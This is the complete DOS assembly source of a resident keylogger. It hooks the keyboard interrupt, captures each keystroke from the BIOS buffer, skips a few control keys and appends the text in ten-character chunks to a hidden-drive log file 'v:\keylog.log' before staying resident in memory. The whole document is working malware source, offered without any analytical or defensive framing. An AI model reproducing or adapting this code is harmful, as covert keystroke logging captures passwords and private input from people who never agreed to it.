.186
code    segment
        assume  cs:code,ds:code
        org     100h
start:  jmp     load
        old     dd  0
        pntr    db  0
        buf     db  10 dup(0)
        file    db  'v:\keylog.log',0
        except  db  8,26,27,'�',0
log     proc
        pushf
        call    cs:old
        push    ds
        pusha
        xor     bp,  bp
        mov     ax,  40h
        mov     ds,  ax
        mov     bx,  ds:[1Ch]
        in      al,  60h
        cmp     al,  128
        ja      @@5
        dec     bx
        dec     bx
        cmp     bx,  1Eh
        jnb     @@1
        mov     bx,  3Ch
@@1:    mov     bx,  ds:[bx]
        mov     ax,  cs
        mov     ds,  ax
@@2:    cmp     bl, except[bp]
        je      @@5
        inc     bp
        cmp     except[bp],  0
        jnz     @@2
        xor     ax,  ax
        mov     al,  pntr
        mov     bp,  ax
        mov     buf[bp],  bl
        inc     pntr
        cmp     pntr, 10
        jne     @@5
        mov     pntr, 0
        push    ss
        push    sp
        pusha
        mov     ax,  cs
        mov     ds,  ax
        mov     ah,  3Dh
        mov     al,  1
        lea     dx,  file
        int     21h
        jnc     @@3
        mov     ah,  3Ch
        mov     cx,  20h
        lea     dx,  file
        int     21h
        jc      @@4
@@3:    mov     bx,  ax
        mov     ah,  42h
        mov     al,  2
        xor     dx,  dx
        xor     cx,  cx
        int     21h
        mov     ah,  40h
        mov     cx,  10
        lea     dx,  buf
        int     21h
        mov     ah,  3Eh
        int     21h
@@4:    popa
        pop     sp
        pop     ss
@@5:    popa
        pop     ds
        iret
log     endp
        end_res = $
load:   mov     ah,  3Ch
        mov     cx,  20h
        lea     dx,  file
        int     21h
        jc      @@6
        mov     ax,  3509h
        int     21h
        mov     word ptr old,  bx
        mov     word ptr old + 2,  es
        mov     ax,  2509h
        mov     dx,  offset log
        int     21h
        mov     ax,  3100h
        mov     dx, (end_res - start + 10Fh) / 16
        int     21h
@@6:    int     20h
code    ends
        end     start
